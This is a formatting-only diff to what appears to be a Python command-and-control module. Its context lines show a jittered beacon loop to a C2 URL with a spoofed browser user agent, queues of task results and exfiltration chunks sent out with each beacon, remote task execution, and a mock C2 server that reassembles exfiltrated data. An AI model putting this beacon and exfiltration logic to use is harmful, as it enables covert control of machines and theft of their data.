@@ -22,7 +22,10 @@ class CommandControl:
         self.config = {
             "default_interval_seconds": 60,
             "default_jitter_percent": 20,  # Percentage (0-100)
-            "default_user_agent": f"Mozilla/5.0 ({platform.system()} {platform.release()}; rv:10.0) Gecko/20100101 Firefox/10.0",
+            "default_user_agent": (
+                f"Mozilla/5.0 ({platform.system()} {platform.release()}; "
+                "rv:10.0) Gecko/20100101 Firefox/10.0"
+            ),
             "default_http_method": "GET",
             "beacon_timeout_seconds": 30,  # Timeout for individual HTTP requests
             "max_beacon_attempts": 3,  # Max consecutive failures before stopping beacon thread
@@ -63,7 +66,8 @@ class CommandControl:
         if handler:
             try:
                 result = handler(details)
-                # If starting a beacon, status reflects thread start success, not beacon success itself
+                # If starting a beacon, status reflects thread start success only,
+                # not beacon success itself
                 return result
             except Exception as e:
                 self.logger.error(
@@ -111,7 +115,8 @@ class CommandControl:
         headers.update(additional_headers)
 
         self.logger.info(
-            f"[Beacon {beacon_id}] Starting beacon thread. Target: {c2_url}, Interval: {interval}s, Jitter: {jitter}%"
+            f"[Beacon {beacon_id}] Starting beacon thread. Target: {c2_url}, "
+            f"Interval: {interval}s, Jitter: {jitter}%"
         )
 
         while not stop_event.is_set():
@@ -138,15 +143,17 @@ class CommandControl:
                     if include_results and self.task_results_queue:
                         beacon_data["results"] = self.task_results_queue[:]
                         self.task_results_queue.clear()
+                        n_results = len(beacon_data["results"])
                         self.logger.debug(
-                            f"[Beacon {beacon_id}] Including {len(beacon_data['results'])} task results."
+                            f"[Beacon {beacon_id}] Including {n_results} task results."
                         )
                     if include_exfil and self.outgoing_exfil_queue:
                         # Embed exfil data under a specific key
                         beacon_data["exfil_data"] = self.outgoing_exfil_queue[:]
                         self.outgoing_exfil_queue.clear()
+                        n_chunks = len(beacon_data["exfil_data"])
                         self.logger.debug(
-                            f"[Beacon {beacon_id}] Including {len(beacon_data['exfil_data'])} exfil chunks."
+                            f"[Beacon {beacon_id}] Including {n_chunks} exfil chunks."
                         )
                 # --- End Prepare Data ---
 
@@ -168,7 +175,8 @@ class CommandControl:
                         # Consider switching to POST if exfil/results are expected
                         if "results" in beacon_data or "exfil_data" in beacon_data:
                             self.logger.warning(
-                                f"[Beacon {beacon_id}] Beacon contains results/exfil data but method is GET. Data might be lost or request may fail."
+                                f"[Beacon {beacon_id}] Beacon contains results/exfil data "
+                                "but method is GET. Data might be lost or request may fail."
                             )
                             # Optionally truncate or remove results/exfil for GET?
 
@@ -192,8 +200,10 @@ class CommandControl:
                     response.raise_for_status()  # Raise exception for bad status codes (4xx or 5xx)
 
                     # Process response
+                    snippet = response.text[:100]
                     self.logger.info(
-                        f"[Beacon {beacon_id}] Beacon sent successfully. Status: {response.status_code}. Response snippet: {response.text[:100]}"
+                        f"[Beacon {beacon_id}] Beacon sent successfully. "
+                        f"Status: {response.status_code}. Response snippet: {snippet}"
                     )
                     # Reset failure count on success
                     failure_count = 0
@@ -216,7 +226,8 @@ class CommandControl:
                                     },
                                 }
                                 self.logger.info(
-                                    f"[Beacon {beacon_id}] SIMULATED received task: {task_to_execute}"
+                                    f"[Beacon {beacon_id}] SIMULATED received task: "
+                                    f"{task_to_execute}"
                                 )
                         else:
                             # Attempt to parse actual JSON response for tasks
@@ -244,22 +255,26 @@ class CommandControl:
                 except requests.exceptions.RequestException as req_err:
                     failure_count += 1
                     self.logger.warning(
-                        f"[Beacon {beacon_id}] Request failed ({failure_count}/{max_failures}): {req_err}"
+                        f"[Beacon {beacon_id}] Request failed ({failure_count}/"
+                        f"{max_failures}): {req_err}"
                     )
                     if failure_count >= max_failures:
                         self.logger.error(
-                            f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}). Stopping worker."
+                            f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}). "
+                            "Stopping worker."
                         )
                         break  # Exit loop
                 except Exception as e:
                     failure_count += 1
                     self.logger.error(
-                        f"[Beacon {beacon_id}] Unexpected error during beacon ({failure_count}/{max_failures}): {e}",
+                        f"[Beacon {beacon_id}] Unexpected error during beacon ("
+                        f"{failure_count}/{max_failures}): {e}",
                         exc_info=True,
                     )
                     if failure_count >= max_failures:
                         self.logger.error(
-                            f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}) due to unexpected errors. Stopping worker."
+                            f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}) "
+                            "due to unexpected errors. Stopping worker."
                         )
                         break  # Exit loop
 
@@ -424,8 +439,9 @@ class CommandControl:
                 # Prepare the result payload
                 result_payload["status"] = task_result.get("status", "unknown")
                 result_payload["result_data"] = task_result  # Include the full result dict
+                exec_status = result_payload["status"]
                 self.logger.info(
-                    f"Task {task_id} ({module}) execution finished with status: {result_payload['status']}"
+                    f"Task {task_id} ({module}) execution finished with status: {exec_status}"
                 )
 
             except Exception as e:
@@ -442,7 +458,8 @@ class CommandControl:
                 self.logger.debug(f"Queued result for task {task_id}")
         else:
             self.logger.debug(
-                f"Task results configured to not be sent via beacon. Discarding result for task {task_id}."
+                "Task results configured to not be sent via beacon. "
+                f"Discarding result for task {task_id}."
             )
 
     def execute(self, params: Dict[str, Any], ctx: Dict[str, Any]) -> ModuleResult:
@@ -525,12 +542,19 @@ if __name__ == "__main__":
                         )
                         # Basic reassembly check
                         if exfil_chunks_received:
+                            ch0 = exfil_chunks_received[0]
                             mock_c2_logger.info(
-                                f"    First chunk: session={exfil_chunks_received[0].get('session_id')}, index={exfil_chunks_received[0].get('chunk_index')}, last={exfil_chunks_received[0].get('is_last')}"
+                                "    First chunk: "
+                                f"session={ch0.get('session_id')}, index={ch0.get('chunk_index')}, "
+                                f"last={ch0.get('is_last')}"
                             )
                             if len(exfil_chunks_received) > 1:
+                                chn = exfil_chunks_received[-1]
                                 mock_c2_logger.info(
-                                    f"    Last chunk: session={exfil_chunks_received[-1].get('session_id')}, index={exfil_chunks_received[-1].get('chunk_index')}, last={exfil_chunks_received[-1].get('is_last')}"
+                                    "    Last chunk: "
+                                    f"session={chn.get('session_id')}, "
+                                    f"index={chn.get('chunk_index')}, "
+                                    f"last={chn.get('is_last')}"
                                 )
 
                     if "results" in received_data:
@@ -585,7 +609,8 @@ if __name__ == "__main__":
             self, module_name: str, operation_data: Dict[str, Any]
         ) -> Dict[str, Any]:
             print(
-                f"\n<------ [MockNexus] Received task! Module: '{module_name}', Data: {operation_data} ------>\n"
+                "\n<------ [MockNexus] Received task! "
+                f"Module: '{module_name}', Data: {operation_data} ------>\n"
             )
             time.sleep(0.5)
             return {
